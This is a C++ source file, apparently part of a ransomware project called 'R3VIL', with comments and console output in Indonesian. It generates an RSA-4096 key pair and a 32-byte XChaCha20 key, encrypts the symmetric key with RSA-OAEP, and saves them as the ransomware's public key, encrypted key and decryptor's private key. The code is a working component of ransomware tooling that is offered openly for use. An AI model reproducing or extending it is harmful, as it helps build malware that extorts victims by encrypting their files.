// generate.cpp - Key Generator for R3VIL Ransomware (XChaCha20Poly1305)
#include <cryptopp/cryptlib.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/files.h>
#include <cryptopp/filters.h>
#include <cryptopp/pkcspad.h>
#include <cryptopp/hex.h>

#include <iostream>
#include <string>
#include <filesystem>

using namespace CryptoPP;
namespace fs = std::filesystem;

int main() {
    std::cout << "\n========================================\n";
    std::cout << "     R3VIL Ransomware Key Generator     \n";
    std::cout << "========================================\n\n";

    AutoSeededRandomPool rng;

    std::cout << "[*] Generating RSA-4096 key pair...\n";

    // Generate RSA Private Key (4096 bit - sangat aman)
    RSA::PrivateKey privateKey;
    privateKey.GenerateRandomWithKeySize(rng, 4096);

    RSA::PublicKey publicKey(privateKey);

    // Simpan RSA Public Key
    FileSink pubFile("rsa_public.der", true);
    publicKey.Save(pubFile);
    pubFile.MessageEnd();

    // Simpan RSA Private Key
    FileSink privFile("rsa_private.der", true);
    privateKey.Save(privFile);
    privFile.MessageEnd();

    std::cout << "[✓] RSA Key Pair generated successfully!\n";
    std::cout << "    → rsa_public.der  (untuk ransomware)\n";
    std::cout << "    → rsa_private.der (untuk decryptor)\n\n";

    // Generate Symmetric Key (32-byte untuk XChaCha20)
    SecByteBlock symmetricKey(32);
    rng.GenerateBlock(symmetricKey, symmetricKey.size());

    // Encrypt symmetric key dengan RSA Public Key
    RSAES_OAEP_SHA_Encryptor encryptor(publicKey);

    std::string encryptedKey;
    StringSource ss(symmetricKey, symmetricKey.size(), true,
        new PK_EncryptorFilter(rng, encryptor, new StringSink(encryptedKey))
    );

    // Simpan encrypted symmetric key
    FileSink keyFile("aes_key.enc", true);
    keyFile.Put(reinterpret_cast<const byte*>(encryptedKey.data()), encryptedKey.size());
    keyFile.MessageEnd();

    std::cout << "[✓] Symmetric key (32-byte) generated and encrypted with RSA\n";
    std::cout << "    → aes_key.enc (akan digunakan oleh ransomware)\n\n";

    // Tampilkan informasi
    std::cout << "========================================\n";
    std::cout << "               SUMMARY                  \n";
    std::cout << "========================================\n";
    std::cout << "RSA Key Size       : 4096 bit\n";
    std::cout << "Symmetric Key      : 256-bit (32 bytes)\n";
    std::cout << "Encryption Scheme  : RSA-OAEP-SHA + XChaCha20Poly1305\n";
    std::cout << "Nonce Size         : 24 bytes (XChaCha20)\n";
    std::cout << "Tag Size           : 16 bytes (Poly1305)\n";
    std::cout << "========================================\n\n";

    std::cout << "[!] Simpan file-file berikut dengan aman:\n";
    std::cout << "    • rsa_private.der  ← JANGAN hilang! (untuk decrypt)\n";
    std::cout << "    • rsa_public.der   ← Untuk ransomware\n";
    std::cout << "    • aes_key.enc      ← Hasil enkripsi symmetric key\n\n";

    std::cout << "Key generation completed successfully!\n";

    return 0;
}
